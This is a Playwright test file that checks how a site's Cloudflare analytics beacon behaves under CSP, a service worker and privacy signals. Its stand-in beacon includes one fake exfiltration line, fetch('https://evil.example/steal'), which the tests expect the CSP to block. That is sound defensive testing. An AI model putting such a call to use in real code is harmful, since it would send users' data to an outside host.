// SPDX-License-Identifier: AGPL-3.0-or-later
// Cloudflare Web Analytics (ADR 0015). The build is served as if it were the public site
// (https://aasanchez.github.io/dnilimpio.es/, a subpath), so the beacon's rules run for real: CSP,
// Trusted Types, the service worker and the host check. Cloudflare itself is never contacted: a stand-in
// beacon answers at its address, and its reports are recorded here.
import { expect, test, type BrowserContext, type Page } from '@playwright/test'
import { BEACON_ENDPOINT, BEACON_SCRIPT, BEACON_TOKEN } from '../../src/analytics/endpoints.ts'

test.use({ locale: 'es-ES' })

const SITE = 'https://aasanchez.github.io/dnilimpio.es/'
const LOCAL = 'http://localhost:4173/'

/**
 * Stands in for Cloudflare's beacon: reads its settings from its own tag, as the real one does,
 * reports one page view, and tries one address the CSP must refuse.
 */
const FAKE_BEACON = `
const tag = document.querySelector('script[data-cf-beacon]')
const config = JSON.parse(tag.dataset.cfBeacon)
navigator.sendBeacon(${JSON.stringify(BEACON_ENDPOINT)}, JSON.stringify({ token: config.token, page: location.pathname }))
fetch('https://evil.example/steal').catch(() => {})
`

interface Traffic { beacon: number; reports: string[]; foreign: string[] }

/** Serves the local build at SITE, the stand-in beacon at Cloudflare's address, and records the rest. */
async function asPublicSite (context: BrowserContext, { beacon = 'ok' }: { beacon?: 'ok' | 'down' } = {}): Promise<Traffic> {
  const traffic: Traffic = { beacon: 0, reports: [], foreign: [] }
  await context.route('**/*', async (route) => {
    const req = route.request()
    const url = req.url()
    if (url.startsWith(SITE)) {
      const res = await fetch(LOCAL + url.slice(SITE.length))
      const headers = Object.fromEntries([...res.headers].filter(([k]) => !['content-encoding', 'content-length'].includes(k)))
      await route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) })
    } else if (url === BEACON_SCRIPT) {
      traffic.beacon++
      if (beacon === 'down') await route.abort('internetdisconnected')
      else await route.fulfill({ contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: FAKE_BEACON })
    } else if (url.split('?')[0] === BEACON_ENDPOINT) {
      traffic.reports.push(req.postData() ?? '')
      await route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' } })
    } else if (!/^(blob|data):/.test(url)) {
      traffic.foreign.push(`${req.method()} ${url}`)
      await route.abort('blockedbyclient')
    }
  })
  return traffic
}

/** CSP and Trusted Types reports, other than the one the stand-in beacon causes on purpose. */
function watchViolations (page: Page): string[] {
  const violations: string[] = []
  page.on('console', (m) => { if (/Content Security Policy|Trusted Type/i.test(m.text()) && !m.text().includes('evil.example')) violations.push(m.text()) })
  page.on('pageerror', (e) => violations.push(e.message))
  return violations
}

test('on the public site the beacon loads once and reports only the token and the page', async ({ page, context }) => {
  const traffic = await asPublicSite(context)
  const violations = watchViolations(page)
  await page.goto(SITE)
  await expect(page.locator('h1')).toBeVisible()
  await expect.poll(() => traffic.reports.length, { timeout: 15_000 }).toBe(1)
  expect(traffic.beacon).toBe(1)
  expect(JSON.parse(traffic.reports[0] ?? '{}')).toEqual({ token: BEACON_TOKEN, page: '/dnilimpio.es/' })
  // The only thing the app hands the beacon is the site token.
  await expect(page.locator('script[data-cf-beacon]')).toHaveAttribute('data-cf-beacon', JSON.stringify({ token: BEACON_TOKEN }))
  await expect(page.locator('script[data-cf-beacon]')).toHaveAttribute('src', BEACON_SCRIPT)
  // The CSP stopped the beacon's attempt to reach another address before it left the browser.
  expect(traffic.foreign).toEqual([])
  expect(violations).toEqual([])
  // No cookies and no storage from the beacon.
  expect(await context.cookies()).toEqual([])
  expect(await page.evaluate(() => localStorage.length)).toBe(0) // eslint-disable-line no-restricted-properties
})

test('the service worker lets the beacon through and nothing else', async ({ browser }) => {
  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES' })
  const page = await context.newPage()
  const traffic = await asPublicSite(context)
  await page.goto(SITE)
  await page.evaluate(async () => { await navigator.serviceWorker.ready })
  await expect.poll(async () => await page.evaluate(() => navigator.serviceWorker.controller !== null)).toBe(true)
  // A reload under the worker's control: the beacon and its report still go out.
  const before = traffic.reports.length
  await page.reload()
  await expect(page.locator('h1')).toBeVisible()
  await expect.poll(() => traffic.reports.length, { timeout: 15_000 }).toBe(before + 1)
  expect(traffic.foreign).toEqual([])
  await context.close()
})

test('if Cloudflare cannot be reached the app works and shows no error', async ({ page, context }) => {
  const traffic = await asPublicSite(context, { beacon: 'down' })
  const violations = watchViolations(page)
  await page.goto(SITE)
  await expect.poll(() => traffic.beacon).toBe(1)
  await page.locator('#start').click()
  await expect(page.locator('#file-front')).toBeAttached()
  await expect(page.locator('script[data-cf-beacon]')).toHaveCount(0)
  expect(traffic.reports).toEqual([])
  expect(violations).toEqual([])
})

for (const [name, init] of [
  ['offline', () => { Object.defineProperty(Navigator.prototype, 'onLine', { get: () => false }) }],
  ['Global Privacy Control', () => { Object.defineProperty(Navigator.prototype, 'globalPrivacyControl', { get: () => true }) }],
  ['Do Not Track', () => { Object.defineProperty(Navigator.prototype, 'doNotTrack', { get: () => '1' }) }],
] as const) {
  test(`no beacon when the browser is ${name === 'offline' ? 'offline' : `asking for ${name}`}`, async ({ page, context }) => {
    await context.addInitScript(init)
    const traffic = await asPublicSite(context)
    await page.goto(SITE)
    await expect(page.locator('h1')).toBeVisible()
    await page.waitForTimeout(3000) // past the idle callback that would load it
    expect(traffic.beacon).toBe(0)
    expect(traffic.reports).toEqual([])
    await expect(page.locator('script[data-cf-beacon]')).toHaveCount(0)
  })
}

test('no beacon anywhere but the public site', async ({ page }) => {
  const foreign: string[] = []
  page.on('request', (r) => { if (!r.url().startsWith(LOCAL) && !/^(blob|data):/.test(r.url())) foreign.push(r.url()) })
  await page.goto('/')
  await expect(page.locator('h1')).toBeVisible()
  await page.waitForTimeout(3000)
  await expect(page.locator('script[data-cf-beacon]')).toHaveCount(0)
  expect(foreign).toEqual([])
})
